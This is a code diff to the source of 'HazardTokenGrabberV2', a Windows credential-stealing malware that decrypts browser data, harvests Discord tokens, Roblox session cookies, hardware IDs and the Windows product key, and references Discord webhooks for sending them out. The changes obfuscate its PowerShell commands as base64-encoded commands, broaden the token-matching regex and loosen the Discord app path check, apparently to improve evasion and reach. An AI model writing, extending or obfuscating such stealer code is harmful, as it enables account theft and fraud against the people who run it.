@@ -16,7 +16,7 @@ import subprocess
 
 from sys import argv
 from PIL import ImageGrab
-from base64 import b64decode
+from base64 import b64encode, b64decode
 from Crypto.Cipher import AES
 from tempfile import mkdtemp, gettempdir
 from win32crypt import CryptUnprotectData
@@ -145,9 +145,9 @@ class Functions(object):
     @staticmethod
     def system_info() -> list:
         flag = 0x08000000
-        sh1 = "wmic csproduct get uuid"
-        sh2 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"
-        sh3 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName"
+        sh1 = "powershell -encodedCommand dwBtAGkAYwAgAGMAcwBwAHIAbwBkAHUAYwB0ACAAZwBlAHQAIAB1AHUAaQBkAA=="
+        sh2 = "powershell -encodedCommand RwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQBWAGEAbAB1AGUAIAAtAFAAYQB0AGgAIAAnAEgASwBMAE0AOgBTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIABOAFQAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABTAG8AZgB0AHcAYQByAGUAUAByAG8AdABlAGMAdABpAG8AbgBQAGwAYQB0AGYAbwByAG0AJwAgAC0ATgBhAG0AZQAgAEIAYQBjAGsAdQBwAFAAcgBvAGQAdQBjAHQASwBlAHkARABlAGYAYQB1AGwAdAA="
+        sh3 = "powershell -encodedCommand RwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQBWAGEAbAB1AGUAIAAtAFAAYQB0AGgAIAAnAEgASwBMAE0AOgBTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIABOAFQAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AJwAgAC0ATgBhAG0AZQAgAFAAcgBvAGQAdQBjAHQATgBhAG0AZQA="
         try:
             HWID = subprocess.check_output(sh1, creationflags=flag).decode().split('\n')[1].strip()
         except Exception:
@@ -181,6 +181,10 @@ class Functions(object):
     def fetch_conf(e: str) -> str or bool | None:
         return __config__.get(e)
 
+    @staticmethod
+    def powershell_encode(a: str):
+        return "powershell -encodedCommand " + b64encode(a.encode("utf-16-le")).decode()
+
 
 class HazardTokenGrabberV2(Functions):
     def __init__(self):
@@ -197,7 +201,7 @@ class HazardTokenGrabberV2(Functions):
 
         self.hook_reg = "api/webhooks"
         self.chrome_reg = re.compile(r'^(profile\s\d*)|(default)|(guest profile)$', re.IGNORECASE | re.MULTILINE)
-        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
+        self.regex = r"[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110}"
         self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
 
         self.sep = os.sep
@@ -274,7 +278,7 @@ class HazardTokenGrabberV2(Functions):
             if 'discord' in _dir.lower():
                 discord = self.appdata + os.sep + _dir
                 for __dir in os.listdir(ntpath.abspath(discord)):
-                    if re.match(r'app-(\d*\.\d*)*', __dir):
+                    if re.match(r'app.+', __dir):
                         app = ntpath.abspath(ntpath.join(discord, __dir))
                         modules = ntpath.join(app, 'modules')
                         if not ntpath.exists(modules):
@@ -553,7 +557,7 @@ class HazardTokenGrabberV2(Functions):
         def subproc(path):
             try:
                 return subprocess.check_output(
-                    fr"powershell Get-ItemPropertyValue -Path {path}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY",
+                    self.powershell_encode(fr"Get-ItemPropertyValue -Path {path}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY"),
                     creationflags=0x08000000).decode().rstrip()
             except Exception:
                 return None
